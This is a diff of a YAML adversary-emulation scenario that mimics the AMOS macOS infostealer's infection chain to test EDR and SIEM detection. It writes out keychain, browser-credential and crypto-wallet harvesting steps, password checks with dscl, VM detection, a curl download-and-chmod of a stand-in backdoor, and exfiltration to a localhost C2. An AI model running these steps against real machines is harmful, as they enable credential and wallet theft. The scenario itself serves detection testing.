@@ -8,7 +8,7 @@ description: |
   macOS infostealer tracked by SentinelOne, Kandji, Picus, and Microsoft Defender.
 
   This scenario covers the complete 2025 variant infection chain across 10 phases,
-  exercising 22 modules across every category. It is designed to validate EDR and SIEM
+  composing native operations and reusable recipes. It is designed to validate EDR and SIEM
   coverage across every major tactic: execution, defense evasion, credential access,
   discovery, collection, exfiltration, and persistence.
 
@@ -55,6 +55,12 @@ description: |
     T1622      Debugger Evasion (VM/sandbox detection)
     T1071.001  Application Layer Protocol: Web Protocols (C2 polling)
 
+inputs:
+  collection_roots:
+    type: path_list
+    default:
+      - /tmp/macnoise_amos_targets
+
 # ──────────────────────────────────────────────────────────────────────────────
 # PHASE 1 — INITIAL ACCESS & GATEKEEPER BYPASS
 #
@@ -72,9 +78,12 @@ steps:
       target_path: /tmp/macnoise_amos
 
   # T1548.001 / T1204.002 — set executable bit on hidden Mach-O binary
-  - module: proc_spawn
+  - module: proc_exec
     params:
-      command: "chmod +x /tmp/macnoise_amos 2>/dev/null || true"
+      executable: /bin/sh
+      args:
+        - -c
+        - "chmod +x /tmp/macnoise_amos 2>/dev/null || true"
 
 # ──────────────────────────────────────────────────────────────────────────────
 # PHASE 2 — DEFENSE EVASION
@@ -116,9 +125,12 @@ steps:
 
   # T1078 / T1056.004 — validate harvested password via dscl authonly
   # dscl /Local/Default -authonly <username> <password> returns exit 0 on success
-  - module: proc_spawn
+  - module: proc_exec
     params:
-      command: "dscl /Local/Default -authonly $(whoami) '' 2>/dev/null; echo $? > /tmp/macnoise_amos_auth_result || true"
+      executable: /bin/sh
+      args:
+        - -c
+        - "dscl /Local/Default -authonly $(whoami) '' 2>/dev/null; echo $? > /tmp/macnoise_amos_auth_result || true"
 
 # ──────────────────────────────────────────────────────────────────────────────
 # PHASE 4 — SYSTEM RECONNAISSANCE
@@ -127,20 +139,32 @@ steps:
 # included in the exfiltrated ZIP archive alongside stolen credentials. The
 # profile covers OS version, hardware model, CPU architecture (x86 vs ARM/M-series),
 # display configuration, and hardware serial numbers for victim deduplication.
-# XPC service enumeration identifies installed security software and high-value
+# Launchd service enumeration identifies installed security software and high-value
 # targets (crypto apps, enterprise MDM) for follow-on prioritization.
 # ──────────────────────────────────────────────────────────────────────────────
 
   # T1082 / T1057 — system profile + hardware recon: OS version, hardware model, architecture,
   # display config, and hardware serial numbers for victim deduplication
   # Output written to SysInfo.txt for inclusion in exfil archive
-  - module: proc_discovery
-    params:
-      commands: "sw_vers,system_profiler SPHardwareDataType,uname -m,system_profiler SPDisplaysDataType,ioreg -l | grep -i IOPlatformSerialNumber | head -5"
+  - id: system_discovery
+    include: recipes/system_discovery.yaml
 
-  # T1057 — enumerate running XPC services and installed applications
+  - module: proc_exec
+    params:
+      executable: /usr/sbin/system_profiler
+      args:
+        - SPDisplaysDataType
+
+  - module: proc_exec
+    params:
+      executable: /bin/sh
+      args:
+        - -c
+        - "ioreg -l | grep -i IOPlatformSerialNumber | head -5"
+
+  # T1007 - enumerate launchd services and installed applications
   # Identifies: security software, crypto apps, enterprise tooling, MDM agents
-  - module: xpc_enumerate
+  - module: svc_enumerate
 
 # ──────────────────────────────────────────────────────────────────────────────
 # PHASE 5 — CREDENTIAL ACCESS
@@ -161,22 +185,35 @@ steps:
   # AMOS: security unlock-keychain -p <pass> login.keychain-db
   - module: cred_keychain
 
-  # T1555.001/T1074.001 — copy the keychain databases wholesale into a staging dir
+  # T1555.001/T1074.001 - discover keychain databases beneath explicit roots
   # AMOS: cp login.keychain-db to exfil/Keychain/kc.db before archiving
-  # Staged separately from macnoise_amos_staging because each module cleans up its
-  # own directory as soon as it finishes, which would delete the archive source.
-  - module: file_keychain_copy
+  - id: keychain_targets
+    include: recipes/keychain_targets.yaml
+    inputs:
+      roots:
+        input: collection_roots
+
+  - module: file_copy
     params:
-      stage_dir: /tmp/macnoise_amos_keychain
+      source_paths:
+        output: keychain_targets.paths
+      destination_dir: /tmp/macnoise_amos_keychain
 
   # T1555.003 — read credential files for all browser families:
   # Chrome, ChromeCanary, Brave, Arc, Edge, Vivaldi, Yandex, Opera, OperaGX
   # (Login Data/Cookies/Web Data/Local State, every profile directory),
   # Firefox (logins.json + key4.db), and Safari (Cookies.binarycookies).
   # Contents are discarded; only the open/read is generated.
-  - module: file_browser_creds
+  - id: browser_targets
+    include: recipes/browser_targets.yaml
+    inputs:
+      roots:
+        input: collection_roots
+
+  - module: file_read
     params:
-      browsers: all
+      paths:
+        output: browser_targets.paths
 
 # ──────────────────────────────────────────────────────────────────────────────
 # PHASE 6 — COLLECTION
@@ -193,43 +230,82 @@ steps:
   # T1636.003 — enumerate AddressBook / Contacts directory
   - module: tcc_contacts
 
-  # T1083 / T1005 — sweep Desktop, Downloads, Documents for targeted file extensions
+  # T1083 / T1005 - sweep explicit roots for targeted file extensions
   # Size limit: <51,200 bytes (AMOS FileGrabber module constraint, SpyCloud 2024)
   # Extensions: TXT, DOCX, RTF, DOC, WALLET, KEYS, KEY
-  - module: proc_spawn
+  - id: document_targets
+    include: recipes/document_targets.yaml
+    inputs:
+      roots:
+        input: collection_roots
+
+  - module: file_read
     params:
-      command: "find ~/Desktop ~/Downloads ~/Documents -maxdepth 3 -type f \\( -name '*.txt' -o -name '*.docx' -o -name '*.rtf' -o -name '*.wallet' -o -name '*.keys' -o -name '*.key' \\) -size -50k 2>/dev/null | head -100 || true"
+      paths:
+        output: document_targets.paths
 
   # T1005 — collect Apple Notes database (NoteStore.sqlite + WAL files)
-  - module: proc_spawn
+  - id: notes_targets
+    module: file_find
     params:
-      command: "find ~/Library/Group\\ Containers -maxdepth 4 -name 'NoteStore.sqlite*' 2>/dev/null | head -5 || true"
+      roots:
+        input: collection_roots
+      names:
+        - NoteStore.sqlite
+        - NoteStore.sqlite-shm
+        - NoteStore.sqlite-wal
+      max_depth: 8
+      max_results: 5
 
-  # T1005 — enumerate Telegram tdata session folder (account tokens, chat history)
-  - module: proc_spawn
+  - module: file_read
     params:
-      command: "ls ~/Library/Group\\ Containers/6N38VWS5BX.ru.keepcoder.Telegram/ 2>/dev/null | head -10 || true"
+      paths:
+        output: notes_targets.paths
 
-  # T1005 — enumerate cryptocurrency wallet application directories
+  # T1005 - discover Telegram and cryptocurrency wallet data beneath explicit roots
   # AMOS targets: Exodus, Electrum, Coinomi, Guarda, Wasabi, Atomic, Ledger Live
   # Seeks: passphrase.json, wallet files, seed phrase backups
-  - module: proc_spawn
+  - id: wallet_targets
+    module: file_find
     params:
-      command: "for w in Exodus Electrum Atomic Guarda 'Ledger Live' Wasabi\\ Wallet Coinomi; do ls ~/Library/Application\\ Support/\"$w\" 2>/dev/null && echo \"Wallet found: $w\"; done || true"
+      roots:
+        input: collection_roots
+      names:
+        - map0
+        - settingss
+        - passphrase.json
+        - wallet.dat
+        - seed.txt
+      max_depth: 8
+      max_results: 100
+
+  - module: file_read
+    params:
+      paths:
+        output: wallet_targets.paths
 
   # T1074.001 — create staging directory (AMOS uses a random numeric name)
   # Simulates the exfil bundle: Keychain/, FileGrabber/, Browsers/, SysInfo.txt
-  - module: file_create
+  - id: staging
+    module: file_create
     params:
       base_dir: "/tmp/macnoise_amos_staging"
       count: "18"
       prefix: "collected_"
 
-  # T1074.001 — write SysInfo.txt to staging dir (included in every AMOS exfil bundle)
+  # T1074.001 - write SysInfo.txt to the same staging directory
+  - id: sysinfo
+    module: file_create
+    params:
+      base_dir: /tmp/macnoise_amos_staging
+      filename: SysInfo.txt
+      content: AMOS SysInfo MacNoise telemetry marker
+
   - module: file_modify
     params:
-      target_path: "/tmp/macnoise_amos_staging/SysInfo.txt"
-      content: "AMOS SysInfo — MacNoise telemetry marker"
+      target_path:
+        output: sysinfo.path
+      content: collected for archive
 
 # ──────────────────────────────────────────────────────────────────────────────
 # PHASE 7 — COMPROMISE APPLICATION INTEGRITY
@@ -263,16 +339,12 @@ steps:
 # After exfiltration, the staging directory and ZIP are deleted.
 # ──────────────────────────────────────────────────────────────────────────────
 
-  # T1560.001 — file create/write/delete cycle for ZIP archive
-  # Triggers ES_EVENT_TYPE_NOTIFY_CREATE, NOTIFY_WRITE, NOTIFY_UNLINK on the archive
-  - module: es_file
+  # T1560.001 - zip the connected staging directory into a single archive
+  - id: archive
+    module: file_archive
     params:
-      work_dir: "/tmp/macnoise_amos_archive"
-
-  # T1560.001 — zip the full staging directory into a single archive
-  - module: file_archive
-    params:
-      source_path: /tmp/macnoise_amos_staging
+      source_path:
+        output: staging.directory
       output_path: /tmp/macnoise_amos_payload.zip
       tool: zip
 
@@ -282,14 +354,11 @@ steps:
       domains: "update.example.com,cdn.example.net,telemetry.example.org"
 
   # T1041 — HTTP POST base64-encoded ZIP to /joinsystem endpoint on C2
-  - module: net_exfil
-    params:
-      target: "http://127.0.0.1:8080/joinsystem"
-
-  # T1070.004 — delete staging directory and ZIP post-exfiltration (anti-forensics)
-  - module: proc_spawn
-    params:
-      command: "rm -rf /tmp/macnoise_amos_staging /tmp/macnoise_amos_payload.zip /tmp/macnoise_amos_archive 2>/dev/null || true"
+  - id: exfiltration
+    include: recipes/http_exfil.yaml
+    inputs:
+      target: http://127.0.0.1:8080/joinsystem
+      body: macnoise AMOS archive payload
 
 # ──────────────────────────────────────────────────────────────────────────────
 # PHASE 9 — BACKDOOR INSTALLATION (installBot — mid-2025 variant)
@@ -315,9 +384,12 @@ steps:
 # ──────────────────────────────────────────────────────────────────────────────
 
   # T1105 — download .helper backdoor binary from C2 (/zxc/app endpoint)
-  - module: proc_spawn
+  - module: proc_exec
     params:
-      command: "curl -fsSL http://127.0.0.1:8080/zxc/app -o /tmp/macnoise_amos_helper 2>/dev/null; chmod +x /tmp/macnoise_amos_helper 2>/dev/null || true"
+      executable: /bin/sh
+      args:
+        - -c
+        - "curl -fsSL http://127.0.0.1:8080/zxc/app -o /tmp/macnoise_amos_helper 2>/dev/null; chmod +x /tmp/macnoise_amos_helper 2>/dev/null || true"
 
   # T1059.004 — write ~/.agent bash wrapper (osascript loop for user-context execution)
   - module: file_modify
@@ -361,9 +433,12 @@ steps:
 
   # T1622 — VM/sandbox detection: check hypervisor presence and known VM artefacts
   # .helper checks: kern.hv_vmm_present, ioreg for VMware/QEMU/VirtualBox strings
-  - module: proc_spawn
+  - module: proc_exec
     params:
-      command: "sysctl -n kern.hv_vmm_present 2>/dev/null; ioreg -l 2>/dev/null | grep -iE 'vmware|qemu|vbox|parallels' | head -5 || true"
+      executable: /bin/sh
+      args:
+        - -c
+        - "sysctl -n kern.hv_vmm_present 2>/dev/null; ioreg -l 2>/dev/null | grep -iE 'vmware|qemu|vbox|parallels' | head -5 || true"
 
   # T1071.001 — register with C2: POST /api/join/ → receive unique bot ID in response
   - module: net_connect
@@ -371,17 +446,15 @@ steps:
       target: "127.0.0.1"
       port: "443"
 
-  # T1059.004 — simulate .agent → osascript → .helper nested process chain
-  # Each poll cycle generates ES_EVENT_TYPE_NOTIFY_EXEC/FORK/EXIT — use chain_depth: 3
-  # to reflect the three-layer wrapper: launchd → bash(.agent) → osascript → .helper
-  - module: es_process
-    params:
-      chain_depth: "3"
+  # T1059.004 - simulate the nested wrapper with explicit process execution
+  - id: process_chain
+    include: process_chain.yaml
 
   # T1071.001 — poll /api/tasks/<bot-id> every 60s for operator commands
   # Commands: execute (shell), pong (sleep), repeat, delete (self-removal)
-  - module: net_beacon
-    params:
-      target: "http://example.com"
-      count: "6"
-      interval: "10"
+  - id: c2_beacon
+    include: recipes/http_beacon.yaml
+    inputs:
+      target: http://example.com
+      count: 6
+      interval: 10
